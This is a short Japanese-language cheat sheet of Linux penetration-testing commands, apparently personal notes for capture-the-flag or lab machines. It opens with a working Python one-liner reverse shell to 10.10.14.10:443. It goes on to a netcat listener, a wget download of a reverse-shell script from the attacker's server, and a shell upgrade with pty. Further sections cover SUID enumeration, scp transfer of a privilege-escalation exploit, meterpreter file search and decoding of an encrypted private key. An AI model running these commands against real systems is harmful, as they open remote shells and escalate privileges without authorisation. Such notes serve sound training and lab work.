# Linux Commands
## リバースシェルを得るために

Python2
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
```
```
s.connect(("10.10.14.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 
```
```
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

[Other Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

より安定したbashシェルに切り替える
```
python -c 'import pty; pty.spawn("/bin/bash");'
```
```
/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
```

攻撃端末でサーバを立ち上げる
```
python -m SimpleHTTPServer 80
```

対象端末でファイルをDL
```
wget 10.10.14.23/reverse_shell_python2.py
```

接続待ち
```
nc -nvlp 4444
```

ファイル検索
```
find ./ -name "root.*"
```

findコマンドでSUIDに設定されている実行ファイルの列挙
```
 find / -perm -4000
 ```
 ```
 find / -perm -2000 -type d 2>/dev/null|xargs ls -ld|grep "rwx"
 ```
 ```
 find / -perm -u=s -type f 2>/dev/null
```

meterpreter shell でファイル調査
```
meterpreter > search -f flag*.txt
```

### 権限周り
権限確認
```
ls -l /
```

特定のユーザ権限でコマンド実行
```
sudo -u scriptmanager bash -i
```

権限昇格のためのエクスプロイト転送
```
scp -i id_rsa ../exploits/6851.c root@10.0.2.4:home/exploits
```

権限降格
```
su - <user_name>
```

### その他
可読部分を読みだす
```
root@raspberrypi:/dev# strings sdb
3d3e483143ff12ec505d026fa13e020b 
Damnit! Sorry man I accidentally deleted your files off the USB stick. 
Do you know if there is any way to get them back? 
-Jame
```

プレーン16進ファイルをバイナリ形式に変換
```
cat hype_key | xxd -r -p > hype_key_encrypted
```
「-r」: 16進 →　2進  
「-p」: 空白と改行を無視(行番号と特定の書式がないときに指定)  

暗号化された秘密鍵を複合
```
openssl rsa -in hype_key_encrypted -out
```


